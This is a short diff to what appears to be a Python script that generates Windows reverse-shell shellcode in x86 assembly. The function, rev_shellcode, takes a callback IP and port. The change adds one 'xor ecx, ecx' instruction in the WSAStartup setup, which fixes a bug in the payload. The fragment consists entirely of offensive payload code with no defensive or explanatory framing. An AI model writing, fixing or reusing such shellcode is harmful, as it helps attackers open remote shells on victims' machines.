@@ -182,6 +182,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
         "   call_wsastartup:                    ;",
         "       mov eax, esp                    ;",  # Move ESP to EAX
+        "       xor ecx, ecx                    ;",
         "       mov cx, 0x590                   ;",  # Move 0x590 to CX
         "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
         "       push eax                        ;",  # Push lpWSAData
